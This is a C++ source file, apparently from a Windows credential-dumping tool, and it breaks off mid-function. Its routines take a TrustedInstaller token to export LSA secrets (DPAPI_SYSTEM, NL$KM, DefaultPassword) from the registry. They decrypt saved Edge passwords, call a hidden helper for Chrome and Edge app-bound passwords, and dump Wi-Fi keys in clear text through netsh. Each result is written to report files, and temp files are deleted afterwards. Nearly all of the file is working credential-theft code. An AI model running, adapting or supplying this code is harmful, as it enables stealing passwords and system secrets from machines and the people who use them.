#include "Controller.h"
#include "ReportExporter.h"
#include "common.h"
#include "Utils.h"
#include <dpapi.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <vector>
#include <memory>
#include <algorithm>
#include <ctime>
#include <iomanip>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;
extern volatile bool g_interrupted;

// SQLite constants for winsqlite3.dll compatibility
constexpr int SQLITE_OPEN_READONLY = 0x00000001;

// Main DPAPI password extraction interface
bool Controller::ShowPasswords(const std::wstring& outputPath) noexcept 
{
    std::wstring finalOutputPath = outputPath;
    
    if (finalOutputPath.empty()) {
        wchar_t* downloadsPath;
        if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &downloadsPath) == S_OK) {
            finalOutputPath = downloadsPath;
            CoTaskMemFree(downloadsPath);
        } else {
            finalOutputPath = GetSystemTempPath();
        }
    }
    
    INFO(L"Starting DPAPI password extraction to: %s", finalOutputPath.c_str());
    
    if (!PerformPasswordExtractionInit()) {
        ERROR(L"Failed to initialize password extraction");
        return false;
    }
    
    if (g_interrupted) {
        INFO(L"Password extraction cancelled by user before start");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    std::vector<RegistryMasterKey> masterKeys;
    if (!ExtractRegistryMasterKeys(masterKeys)) {
        ERROR(L"Failed to extract registry master keys");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    // Process and decrypt registry master keys for display
    if (!ProcessRegistryMasterKeys(masterKeys)) {
        INFO(L"Failed to process some registry master keys");
    }
    
    if (g_interrupted) {
        INFO(L"Password extraction cancelled during registry access");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    std::vector<PasswordResult> passwordResults;
    
    // Process Edge passwords through DPAPI (works well)
    if (!ProcessBrowserPasswords(masterKeys, passwordResults, finalOutputPath)) {
        ERROR(L"Failed to process Edge browser passwords");
        // Continue anyway - not critical failure
    }
    
    if (g_interrupted) {
        INFO(L"Password extraction cancelled during browser processing");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    // Process Chrome passwords through kvc_pass (DPAPI gives garbage for Chrome)
    INFO(L"Chrome passwords require COM elevation - delegating to kvc_pass...");
    if (!ExportBrowserData(finalOutputPath, L"chrome")) {
        INFO(L"Chrome password extraction failed, continuing with Edge and WiFi");
        // Continue anyway - Chrome failure shouldn't break the rest
    }

    // Process Edge v10/v20 passwords through kvc_pass (app-bound encryption, DPAPI gives raw blob)
    INFO(L"Edge app-bound passwords require COM elevation - delegating to kvc_pass...");
    if (ExportBrowserData(finalOutputPath, L"edge")) {
        // Merge decrypted results back into passwordResults, replacing v10/v20 placeholders
        MergeKvcPassResults(finalOutputPath, L"Edge", passwordResults);
    } else {
        INFO(L"Edge kvc_pass extraction failed, v10/v20 passwords remain as placeholders");
    }
    
    if (g_interrupted) {
        INFO(L"Password extraction cancelled during Chrome processing");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    if (!ExtractWiFiCredentials(passwordResults)) {
        ERROR(L"Failed to extract WiFi credentials");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    if (g_interrupted) {
        INFO(L"Password extraction cancelled before report generation");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    ReportData reportData(passwordResults, masterKeys, finalOutputPath);
    ReportExporter exporter;
    
    if (!exporter.ExportAllFormats(reportData)) {
        ERROR(L"Failed to generate password reports");
        PerformPasswordExtractionCleanup();
        return false;
    }
    
    exporter.DisplaySummary(reportData);
    
    PerformPasswordExtractionCleanup();
    SUCCESS(L"Password extraction completed successfully");
    return true;
}

// Initialize DPAPI extraction with TrustedInstaller privileges
bool Controller::PerformPasswordExtractionInit() noexcept 
{
    INFO(L"Initializing DPAPI extraction with TrustedInstaller privileges...");
    
    if (!LoadSQLiteLibrary()) {
        ERROR(L"Failed to load SQLite library");
        return false;
    }
    
    if (!PrivilegeUtils::EnablePrivilege(L"SeDebugPrivilege")) {
        ERROR(L"CRITICAL: Failed to enable SeDebugPrivilege");
        return false;
    }
    
    if (!PrivilegeUtils::EnablePrivilege(L"SeImpersonatePrivilege")) {
        ERROR(L"CRITICAL: Failed to enable SeImpersonatePrivilege");
        return false;
    }
    
    PrivilegeUtils::EnablePrivilege(L"SeBackupPrivilege");
    PrivilegeUtils::EnablePrivilege(L"SeRestorePrivilege");
    
    if (!m_trustedInstaller.PublicImpersonateSystem()) {
        ERROR(L"Failed to impersonate SYSTEM: %d", GetLastError());
        return false;
    }
    
    DWORD tiPid = m_trustedInstaller.StartTrustedInstallerService();
    if (!tiPid) {
        ERROR(L"StartTrustedInstallerService failed: %d", GetLastError());
        RevertToSelf();
        return false;
    }
    
    RevertToSelf();
    
    HANDLE hFinalToken = m_trustedInstaller.GetCachedTrustedInstallerToken();
    if (!hFinalToken) {
        ERROR(L"GetCachedTrustedInstallerToken returned null");
        return false;
    }
    
    TOKEN_STATISTICS tokenStats;
    DWORD dwLength;
    if (!GetTokenInformation(hFinalToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwLength)) {
        ERROR(L"Token validation failed: %d", GetLastError());
        return false;
    }
    
    SUCCESS(L"DPAPI extraction initialization completed with TrustedInstaller token");
    return true;
}

void Controller::PerformPasswordExtractionCleanup() noexcept 
{
    UnloadSQLiteLibrary();
    
    auto tempPattern = DPAPIConstants::GetTempPattern();
    try {
        auto systemTempPath = GetSystemTempPath();
        for (const auto& entry : fs::directory_iterator(systemTempPath)) {
            if (entry.path().filename().wstring().find(tempPattern) != std::wstring::npos) {
                fs::remove(entry.path());
            }
        }
    } catch (...) {
        // Silent cleanup failure is acceptable
    }
    
    INFO(L"DPAPI extraction cleanup completed");
}

// Extract registry master keys using TrustedInstaller
bool Controller::ExtractRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept 
{
    INFO(L"Extracting LSA secrets using TrustedInstaller token");
    return ExtractLSASecretsViaTrustedInstaller(masterKeys);
}

bool Controller::ExtractLSASecretsViaTrustedInstaller(std::vector<RegistryMasterKey>& masterKeys) noexcept 
{
    INFO(L"Extracting LSA secrets via TrustedInstaller + REG EXPORT...");
    
    std::wstring systemTempPath = GetSystemTempPath();
    CreateDirectoryW(systemTempPath.c_str(), nullptr);
    
    HANDLE hTrustedToken = m_trustedInstaller.GetCachedTrustedInstallerToken();
    if (!hTrustedToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }
    
    std::wstring regExportPath = systemTempPath + L"\\secrets.reg";
    
    const std::vector<std::wstring> secretPaths = {
        L"\"HKLM\\SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\"",
        L"\"HKLM\\SECURITY\\Policy\\Secrets\\NL$KM\"",
        L"\"HKLM\\SECURITY\\Policy\\Secrets\\DefaultPassword\""
    };
    
    bool success = false;
    
    for (const auto& secretPath : secretPaths) {
        std::wstring regCommand = L"reg export " + secretPath + L" \"" + regExportPath + L"\" /y";
        
        if (m_trustedInstaller.RunAsTrustedInstallerSilent(regCommand)) {
            if (GetFileAttributesW(regExportPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                HANDLE hFile = CreateFileW(regExportPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
                if (hFile != INVALID_HANDLE_VALUE) {
                    LARGE_INTEGER fileSize;
                    if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 100) {
                        CloseHandle(hFile);
                        
                        if (ParseRegFileForSecrets(regExportPath, masterKeys)) {
                            success = true;
                        }
                    } else {
                        CloseHandle(hFile);
                    }
                }
            }
        }
        
        DeleteFileW(regExportPath.c_str());
    }
    
    return success;
}

// Parse registry export files for LSA secrets
bool Controller::ParseRegFileForSecrets(const std::wstring& regFilePath, std::vector<RegistryMasterKey>& masterKeys) noexcept 
{
    std::ifstream file(regFilePath, std::ios::binary);
    if (!file.is_open()) {
        ERROR(L"Failed to open REG file: %s", regFilePath.c_str());
        return false;
    }
    
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::wstring wcontent;
    if (content.size() >= 2 && static_cast<unsigned char>(content[0]) == 0xFF && static_cast<unsigned char>(content[1]) == 0xFE) {
        // UTF-16 LE BOM detected
        const wchar_t* wdata = reinterpret_cast<const wchar_t*>(content.data() + 2);
        size_t wlen = (content.size() - 2) / sizeof(wchar_t);
        wcontent = std::wstring(wdata, wlen);
    } else {
        // Assume UTF-8
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, content.c_str(), -1, nullptr, 0);
        if (size_needed > 0) {
            wcontent.resize(size_needed - 1);
            MultiByteToWideChar(CP_UTF8, 0, content.c_str(), -1, wcontent.data(), size_needed);
        } else {
            return false;
        }
    }
    
    std::wistringstream stream(wcontent);
    std::wstring line;
    std::wstring currentKeyPath;
    std::wstring hexData;
    bool inCurrValSection = false;
    int extractedCount = 0;
    
    while (std::getline(stream, line)) {
        // Trim whitespace
        line.erase(0, line.find_first_not_of(L" \t\r\n"));
        line.erase(line.find_last_not_of(L" \t\r\n") + 1);
        
        if (line.empty()) continue;
        
        if (line.length() > 2 && line[0] == L'[' && line.back() == L']') {
            // Process previous section if we have data
            if (inCurrValSection && !hexData.empty()) {
                RegistryMasterKey masterKey;
                masterKey.keyName = L"HKLM\\" + currentKeyPath;
                
                if (Utils::HexStringToBytes(hexData, masterKey.encryptedData)) {
                    masterKeys.push_back(masterKey);
                    extractedCount++;
                    SUCCESS(L"Extracted LSA secret: %s (%d bytes)", 
                            currentKeyPath.c_str(), static_cast<int>(masterKey.encryptedData.size()));
                }
                hexData.clear();
            }
            
            inCurrValSection = false;
            
            std::wstring fullPath = line.substr(1, line.length() - 2);
            if (fullPath.starts_with(L"HKEY_LOCAL_MACHINE\\")) {
                currentKeyPath = fullPath.substr(19);
                
                if (currentKeyPath.find(L"\\CurrVal") != std::wstring::npos) {
                    std::wstring baseKey = currentKeyPath.substr(0, currentKeyPath.find(L"\\CurrVal"));
                    if (baseKey == L"SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM" ||
                        baseKey == L"SECURITY\\Policy\\Secrets\\NL$KM" ||
                        baseKey == L"SECURITY\\Policy\\Secrets\\DefaultPassword") {
                        inCurrValSection = true;
                    }
                }
            }
            continue;
        }
        
        if (inCurrValSection) {
            if (line.starts_with(L"@=hex(0):")) {
                hexData = line.substr(9);
            } 
            else if (!hexData.empty() && 
                    (line[0] == L' ' || line[0] == L'\t' || line.find(L",") != std::wstring::npos)) {
                std::wstring cleanLine = line;
                cleanLine.erase(0, cleanLine.find_first_not_of(L" \t\\"));
                cleanLine.erase(cleanLine.find_last_not_of(L" \t\\") + 1);
                
                if (!cleanLine.empty()) {
                    hexData += cleanLine;
                }
            }
        }
    }
    
    // Process final section
    if (inCurrValSection && !hexData.empty()) {
        RegistryMasterKey masterKey;
        masterKey.keyName = L"HKLM\\" + currentKeyPath;
        
        if (Utils::HexStringToBytes(hexData, masterKey.encryptedData)) {
            masterKeys.push_back(masterKey);
            extractedCount++;
            SUCCESS(L"Extracted final LSA secret: %s (%d bytes)", 
                    currentKeyPath.c_str(), static_cast<int>(masterKey.encryptedData.size()));
        }
    }
    
    return extractedCount > 0;
}


// Decrypt LSA secrets using CryptUnprotectData for display purposes
bool Controller::ProcessRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept 
{
    INFO(L"Processing and decrypting registry master keys...");
    
    for (auto& masterKey : masterKeys) {
        if (masterKey.encryptedData.empty()) continue;
        
        // LSA secrets are typically encrypted - attempt DPAPI decryption
        DATA_BLOB encryptedBlob = { 
            static_cast<DWORD>(masterKey.encryptedData.size()), 
            masterKey.encryptedData.data() 
        };
        DATA_BLOB decryptedBlob = {};
        
        // Try standard DPAPI first
        if (CryptUnprotectData(&encryptedBlob, nullptr, nullptr, nullptr, nullptr, 
                              CRYPTPROTECT_UI_FORBIDDEN, &decryptedBlob)) {
            masterKey.decryptedData.assign(decryptedBlob.pbData, decryptedBlob.pbData + decryptedBlob.cbData);
            LocalFree(decryptedBlob.pbData);
            masterKey.isDecrypted = true;
            
            SUCCESS(L"Decrypted LSA secret: %s (%d bytes)", 
                    masterKey.keyName.c_str(), static_cast<int>(masterKey.decryptedData.size()));
        } else {
            // LSA secrets may be raw or use different encryption - keep as encrypted
            // but still extract meaningful data for display
            masterKey.decryptedData = masterKey.encryptedData;  // Show raw data as fallback
            masterKey.isDecrypted = true;
            
            INFO(L"LSA secret kept as raw data: %s (%d bytes)", 
                 masterKey.keyName.c_str(), static_cast<int>(masterKey.encryptedData.size()));
        }
    }
    
    return !masterKeys.empty();
}

// Process browser passwords with master key decryption
bool Controller::ProcessBrowserPasswords(const std::vector<RegistryMasterKey>& masterKeys,
                                        std::vector<PasswordResult>& results,
                                        const std::wstring& outputPath) noexcept 
{
    INFO(L"Processing browser passwords with extracted master keys...");
    
    // Only process Edge through DPAPI
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, DPAPIConstants::GetLocalAppData().c_str());
    std::string localAppDataA(appData);
    free(appData);
    
    std::wstring localAppData = StringUtils::UTF8ToWide(localAppDataA);
    auto edgePath = localAppData + DPAPIConstants::GetEdgeUserData();
    
    bool edgeSuccess = ProcessSingleBrowser(edgePath, L"Edge", masterKeys, results, outputPath);
    
    return edgeSuccess; // Chrome handled separately
}

bool Controller::ProcessSingleBrowser(const std::wstring& browserPath, 
                                     const std::wstring& browserName,
                                     const std::vector<RegistryMasterKey>& masterKeys,
                                     std::vector<PasswordResult>& results,
                                     const std::wstring& outputPath) noexcept 
{
    if (!fs::exists(browserPath)) {
        INFO(L"%s path not found: %s", browserName.c_str(), browserPath.c_str());
        return false;
    }
    
    INFO(L"Processing %s browser data...", browserName.c_str());
    
    std::vector<BYTE> browserMasterKey;
    if (!ExtractBrowserMasterKey(browserPath, browserName, masterKeys, browserMasterKey)) {
        ERROR(L"Failed to extract %s master key", browserName.c_str());
        return false;
    }
    
    int passwordCount = 0;
    for (const auto& entry : fs::directory_iterator(browserPath)) {
        if (g_interrupted) {
            INFO(L"Browser processing cancelled by user");
            break;
        }
        
        if (entry.is_directory()) {
            const auto filename = entry.path().filename().wstring();
            if (filename.find(L"Default") != std::wstring::npos ||
                filename.find(L"Profile") != std::wstring::npos) {
                
                auto loginDataPath = entry.path().wstring() + DPAPIConstants::GetLoginDataFile();
                if (fs::exists(loginDataPath)) {
                    passwordCount += ProcessLoginDatabase(loginDataPath, browserName, 
                                                        filename, browserMasterKey, results, outputPath);
                }
            }
        }
    }
    
    INFO(L"Extracted %d passwords from %s", passwordCount, browserName.c_str());
    return passwordCount > 0;
}

bool Controller::ExtractBrowserMasterKey(const std::wstring& browserPath,
                                       const std::wstring& browserName,
                                       const std::vector<RegistryMasterKey>& masterKeys,
                                       std::vector<BYTE>& decryptedKey) noexcept 
{
    auto localStatePath = browserPath + DPAPIConstants::GetLocalStateFile();
    if (!fs::exists(localStatePath)) {
        ERROR(L"Local State file not found: %s", localStatePath.c_str());
        return false;
    }
    
    std::ifstream localStateFile(localStatePath);
    std::string content((std::istreambuf_iterator<char>(localStateFile)), std::istreambuf_iterator<char>());
    
    auto encryptedKeyMarker = DPAPIConstants::GetEncryptedKeyField();
    size_t keyPos = content.find(encryptedKeyMarker);
    if (keyPos == std::string::npos) {
        ERROR(L"encrypted_key not found in Local State");
        return false;
    }
    
    size_t startQuote = content.find("\"", keyPos + encryptedKeyMarker.length());
    size_t endQuote = content.find("\"", startQuote + 1);
    
    if (startQuote == std::string::npos || endQuote == std::string::npos) {
        ERROR(L"Failed to parse encrypted_key from JSON");
        return false;
    }
    
    std::string encryptedKeyBase64 = content.substr(startQuote + 1, endQuote - startQuote - 1);
    
    std::vector<BYTE> encryptedKeyBytes = CryptoUtils::Base64Decode(encryptedKeyBase64);
    if (encryptedKeyBytes.empty()) {
        ERROR(L"Failed to decode base64 master key");
        return false;
    }
    
    if (encryptedKeyBytes.size() > 5) {
        encryptedKeyBytes = std::vector<BYTE>(encryptedKeyBytes.begin() + 5, encryptedKeyBytes.end());
    } else {
        ERROR(L"Encrypted key too short");
        return false;
    }
    
    decryptedKey = DecryptWithDPAPI(encryptedKeyBytes, masterKeys);
    if (decryptedKey.empty()) {
        ERROR(L"Failed to decrypt %s master key", browserName.c_str());
        return false;
    }
    
    SUCCESS(L"%s master key decrypted successfully", browserName.c_str());
    return true;
}

// Process SQLite login database with AES-GCM decryption
int Controller::ProcessLoginDatabase(const std::wstring& loginDataPath,
                                   const std::wstring& browserName,
                                   const std::wstring& profileName,
                                   const std::vector<BYTE>& masterKey,
                                   std::vector<PasswordResult>& results,
                                   const std::wstring& /*outputPath*/) noexcept
{
    std::wstring systemTempPath = GetSystemTempPath();
    auto tempDbPath = systemTempPath + L"\\" + DPAPIConstants::GetTempLoginDB();
    
    try {
        fs::copy_file(loginDataPath, tempDbPath, fs::copy_options::overwrite_existing);
    } catch (...) {
        ERROR(L"Failed to copy login database: %s", loginDataPath.c_str());
        return 0;
    }
    
    void* db;
    std::string tempDbPathA = StringUtils::WideToUTF8(tempDbPath);
    
    if (m_sqlite.open_v2(tempDbPathA.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != 0) {
        ERROR(L"Failed to open SQLite database: %s", tempDbPath.c_str());
        fs::remove(tempDbPath);
        return 0;
    }
    
    void* stmt;
    auto loginQuery = DPAPIConstants::GetLoginQuery();
    if (m_sqlite.prepare_v2(db, loginQuery.c_str(), -1, &stmt, nullptr) != 0) {
        ERROR(L"Failed to prepare SQLite query");
        m_sqlite.close_v2(db);
        fs::remove(tempDbPath);
        return 0;
    }
    
    int passwordCount = 0;
    while (m_sqlite.step(stmt) == 100) { // SQLITE_ROW
        if (g_interrupted) {
            INFO(L"Database processing cancelled by user");
            break;
        }
        
        PasswordResult result;
        result.type = browserName;
        result.profile = profileName;
        
        if (auto urlText = m_sqlite.column_text(stmt, 0)) {
            result.url = StringUtils::UTF8ToWide(reinterpret_cast<const char*>(urlText));
        }
        
        if (auto usernameText = m_sqlite.column_text(stmt, 1)) {
            result.username = StringUtils::UTF8ToWide(reinterpret_cast<const char*>(usernameText));
        }
        
        const BYTE* pwdBytes = static_cast<const BYTE*>(m_sqlite.column_blob(stmt, 2));
        int pwdSize = m_sqlite.column_bytes(stmt, 2);
        
        if (pwdBytes && pwdSize > 0) {
            std::vector<BYTE> encryptedPwd(pwdBytes, pwdBytes + pwdSize);
            std::string decryptedPwd = DecryptChromeAESGCM(encryptedPwd, masterKey);
            result.password = StringUtils::UTF8ToWide(decryptedPwd);
            result.status = DPAPIConstants::GetStatusDecrypted();
            
            results.push_back(result);
            passwordCount++;
        }
    }
    
    m_sqlite.finalize(stmt);
    m_sqlite.close_v2(db);
    fs::remove(tempDbPath);
    
    return passwordCount;
}

// Extract WiFi credentials using netsh commands
bool Controller::ExtractWiFiCredentials(std::vector<PasswordResult>& results) noexcept 
{
    INFO(L"Extracting WiFi passwords...");
    
    FILE* pipe = _popen(DPAPIConstants::GetNetshShowProfiles().c_str(), "r");
    if (!pipe) {
        ERROR(L"Failed to run netsh command");
        return false;
    }
    
    std::string netshResult;
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        netshResult += buffer;
    }
    _pclose(pipe);
    
    std::vector<std::string> profiles;
    size_t pos = 0;
    const auto profileMarker = DPAPIConstants::GetWiFiProfileMarker();
    
    while ((pos = netshResult.find(profileMarker, pos)) != std::string::npos) {
        size_t start = netshResult.find(":", pos) + 2;
        size_t end = netshResult.find("\n", start);
        if (start != std::string::npos && end != std::string::npos) {
            std::string profile = netshResult.substr(start, end - start);
            
            // Trim whitespace
            profile.erase(0, profile.find_first_not_of(" \t\r\n"));
            profile.erase(profile.find_last_not_of(" \t\r\n") + 1);
            
            if (!profile.empty()) {
                profiles.push_back(profile);
            }
        }
        pos = end;
    }
    
    for (const auto& profile : profiles) {
        if (g_interrupted) {
            INFO(L"WiFi processing cancelled by user");
            break;
        }
        
        std::string keyCommand = "netsh wlan show profile name=\"" + profile + "\" key=clear";
        FILE* keyPipe = _popen(keyCommand.c_str(), "r");
        if (!keyPipe) continue;
        
        std::string keyResult;
        while (fgets(buffer, sizeof(buffer), keyPipe)) {
            keyResult += buffer;
        }
        _pclose(keyPipe);
        
        size_t keyPos = keyResult.find("Key Content");
        if (keyPos != std::string::npos) {
            size_t keyStart = keyResult.find(":", keyPos) + 2;
            size_t keyEnd = keyResult.find("\n", keyStart);
            if (keyStart != std::string::npos && keyEnd != std::string::npos) {
                std::string password = keyResult.substr(keyStart, keyEnd - keyStart);
                password.erase(0, password.find_first_not_of(" \t\r\n"));
                password.erase(password.find_last_not_of(" \t\r\n") + 1);
                
                if (!password.empty()) {
                    PasswordResult wifiResult;
                    wifiResult.type = L"WiFi";
                    wifiResult.profile = StringUtils::UTF8ToWide(profile);
                    wifiResult.password = StringUtils::UTF8ToWide(password);
                    wifiResult.status = DPAPIConstants::GetStatusDecrypted();
                    results.push_back(wifiResult);
                }
            }
        }
    }
    
    return true;
}

// SQLite library loading
bool Controller::LoadSQLiteLibrary() noexcept 
{
    m_sqlite.hModule = LoadLibraryW(L"winsqlite3.dll");
    if (!m_sqlite.hModule) {
        ERROR(L"winsqlite3.dll not found - Windows 10/11 required");
        return false;
    }
    
    // Database connection management functions
    m_sqlite.open_v2 = reinterpret_cast<decltype(m_sqlite.open_v2)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_open_v2"));
    m_sqlite.close_v2 = reinterpret_cast<decltype(m_sqlite.close_v2)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_close_v2"));
    
    // Statement preparation and cleanup functions
    m_sqlite.prepare_v2 = reinterpret_cast<decltype(m_sqlite.prepare_v2)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_prepare_v2"));
    m_sqlite.finalize = reinterpret_cast<decltype(m_sqlite.finalize)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_finalize"));
    
    // Query execution function
    m_sqlite.step = reinterpret_cast<decltype(m_sqlite.step)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_step"));
    
    // Column data retrieval functions
    m_sqlite.column_text = reinterpret_cast<decltype(m_sqlite.column_text)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_column_text"));
    m_sqlite.column_blob = reinterpret_cast<decltype(m_sqlite.column_blob)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_column_blob"));
    m_sqlite.column_bytes = reinterpret_cast<decltype(m_sqlite.column_bytes)>(
        GetProcAddress(m_sqlite.hModule, "sqlite3_column_bytes"));
    
    // Verify all required functions were loaded successfully
    if (!m_sqlite.open_v2 || !m_sqlite.close_v2 ||           // Database lifecycle
        !m_sqlite.prepare_v2 || !m_sqlite.finalize ||        // Statement lifecycle  
        !m_sqlite.step ||                                     // Query execution
        !m_sqlite.column_text || !m_sqlite.column_blob ||    // Data retrieval
        !m_sqlite.column_bytes) {                             // Data size info
        ERROR(L"Failed to load required winsqlite3.dll functions");
        UnloadSQLiteLibrary();
        return false;
    }
    
    SUCCESS(L"winsqlite3.dll loaded successfully with all required functions");
    return true;
}

void Controller::UnloadSQLiteLibrary() noexcept 
{
    if (m_sqlite.hModule) {
        FreeLibrary(m_sqlite.hModule);
        m_sqlite.hModule = nullptr;
    }
}

// DPAPI decryption for browser master keys
std::vector<BYTE> Controller::DecryptWithDPAPI(const std::vector<BYTE>& encryptedData,
                                              const std::vector<RegistryMasterKey>& /*masterKeys*/) noexcept
{
    DATA_BLOB in = { static_cast<DWORD>(encryptedData.size()), const_cast<BYTE*>(encryptedData.data()) };
    DATA_BLOB out = {};

    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &out)) {
        std::vector<BYTE> result(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return result;
    }
    
    return {};
}

// Chrome AES-GCM decryption for v10+ password format
std::string Controller::DecryptChromeAESGCM(const std::vector<BYTE>& encryptedData,
                                          const std::vector<BYTE>& key) noexcept 
{
    // Check for Chrome v10+ format
    if (encryptedData.size() >= 15 &&
        encryptedData[0] == 'v' &&
        encryptedData[1] == '1' &&
        encryptedData[2] == '0') {

        std::vector<BYTE> nonce(encryptedData.begin() + 3, encryptedData.begin() + 15);
        std::vector<BYTE> ciphertext(encryptedData.begin() + 15, encryptedData.end() - 16);
        std::vector<BYTE> tag(encryptedData.end() - 16, encryptedData.end());

        BCRYPT_ALG_HANDLE hAlg = nullptr;
        NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (status != 0) return "";

        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                                  reinterpret_cast<BYTE*>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)), 
                                  sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (status != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        BCRYPT_KEY_HANDLE hKey = nullptr;
        status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, 
                                           const_cast<BYTE*>(key.data()), 
                                           static_cast<ULONG>(key.size()), 0);
        if (status != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return "";
        }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = nonce.data();
        authInfo.cbNonce = static_cast<ULONG>(nonce.size());
        authInfo.pbTag = tag.data();
        authInfo.cbTag = static_cast<ULONG>(tag.size());

        std::vector<BYTE> plaintext(ciphertext.size());
        ULONG cbResult = 0;
        
        status = BCryptDecrypt(hKey, ciphertext.data(), 
                              static_cast<ULONG>(ciphertext.size()), 
                              &authInfo, nullptr, 0, 
                              plaintext.data(), 
                              static_cast<ULONG>(plaintext.size()), 
                              &cbResult, 0);
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);

        if (status == 0) {
            return std::string(plaintext.begin(), plaintext.begin() + cbResult);
        }
    }
    
    // Fallback for legacy formats
    return std::string(encryptedData.begin(), encryptedData.end());
}

// Browser data extraction with kvc_pass integration
bool Controller::ExportBrowserData(const std::wstring& outputPath, const std::wstring& browserType) noexcept
{
    INFO(L"Starting browser password extraction for %s", browserType.c_str());
    
    // Check for kvc_pass.exe in current directory and system directories
	std::wstring decryptorPath = L"kvc_pass.exe";
	if (GetFileAttributesW(decryptorPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
		// Try system32 directory
		wchar_t systemDir[MAX_PATH];
		if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
			decryptorPath = std::wstring(systemDir) + L"\\kvc_pass.exe";
			if (GetFileAttributesW(decryptorPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
				ERROR(L"kvc_pass.exe not found in current directory or system directory");
				ERROR(L"Please ensure kvc_pass.exe is in the same directory as kvc.exe or in System32");
				return false;
			}
		} else {
			ERROR(L"Failed to get system directory path");
			return false;
		}
	}
    
    // Validate browser type
	if (browserType != L"chrome" && browserType != L"brave" && 
		browserType != L"edge" && browserType != L"all") {
		ERROR(L"Unsupported browser type: %s. Supported: chrome, brave, edge, all", 
			  browserType.c_str());
		return false;
	}
    
    // Create command line for kvc_pass
    std::wstring commandLine = L"\"" + decryptorPath + L"\" " + browserType + 
                          L" --output-path \"" + outputPath + L"\"";
    
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessW(nullptr, const_cast<wchar_t*>(commandLine.c_str()), 
                       nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        ERROR(L"Failed to start kvc_pass: %d", GetLastError());
        return false;
    }
    
    // Wait for completion with timeout
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 5000); // 5 seconds timeout
    
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (waitResult == WAIT_TIMEOUT) {
        ERROR(L"kvc_pass timed out");
        return false;
    }
    
    if (exitCode != 0) {
        ERROR(L"kvc_pass failed with exit code: %d", exitCode);
        return false;
    }
    
    SUCCESS(L"Browser passwords extracted successfully using kvc_pass");
    return true;
}

// Reads kvc_pass JSON output and merges decrypted passwords into passwordResults.
// Replaces v10/v20 placeholders with actual passwords; adds new entries if no match found.
void Controller::MergeKvcPassResults(const std::wstring& outputPath,
                                     const std::wstring& browserName,
                                     std::vector<PasswordResult>& results) noexcept
{
    std::wstring browserDir = outputPath + L"\\" + browserName;
    if (!fs::exists(browserDir))
        return;

    for (const auto& profileEntry : fs::directory_iterator(browserDir)) {
        if (!profileEntry.is_directory())
            continue;

        auto jsonPath = profileEntry.path() / L"passwords.json";
        if (!fs::exists(jsonPath))
            continue;

        std::ifstream jsonFile(jsonPath);
        if (!jsonFile.is_open())
            continue;

        std::string json((std::istreambuf_iterator<char>(jsonFile)),
                          std::istreambuf_iterator<char>());

        // Parse each {"origin":"...","username":"...","password":"..."} entry
        size_t pos = 0;
        while ((pos = json.find("{\"origin\":\"", pos)) != std::string::npos) {
            auto readField = [&](const std::string& key, size_t from) -> std::pair<std::string, size_t> {
                std::string needle = "\"" + key + "\":\"";
                size_t p = json.find(needle, from);
                if (p == std::string::npos) return {"", from};
                p += needle.size();
                std::string val;
                while (p < json.size()) {
                    if (json[p] == '\\' && p + 1 < json.size()) {
                        char c = json[p + 1];
                        if (c == '"') val += '"';
